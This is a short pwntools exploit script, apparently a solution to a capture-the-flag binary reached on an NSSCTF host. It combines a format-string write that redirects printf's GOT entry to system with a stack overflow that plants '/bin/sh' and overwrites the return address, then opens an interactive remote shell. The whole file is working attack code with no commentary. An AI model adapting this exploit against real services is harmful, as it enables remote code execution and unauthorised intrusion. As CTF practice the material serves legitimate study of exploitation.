from pwn import *

context(os='linux', arch='amd64', kernel='amd64')

#io=gdb.debug('./pwn','''
#            break main
#            break vuln
#            break *0x04007B7
#             ''')
#io=process('./pwn')
io=remote('node4.anna.nssctf.cn',28693)
elf=ELF('./pwn')
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil


printf=elf.got['printf']
system=elf.plt['system']




ret=0x00000000004005b9# : ret

ru(b'name:')
payload1=fmtstr_payload(6,{printf:system})

s(payload1)
ru(b'!')
mian=0x400746
s(b'/bin/sh\x00'+b'a'*(0x60-len(b'/bin/sh\x00')-8)  +p64(0x40076F))
#s(b'/bin/sh\x00'+b'a'*(0x60-len(b'/bin/sh\x00')-8)  +p64(mian))

#sa(b"name:",b'sh\x00')
ru(b'name:')
s(b'sh\x00')









io.interactive()




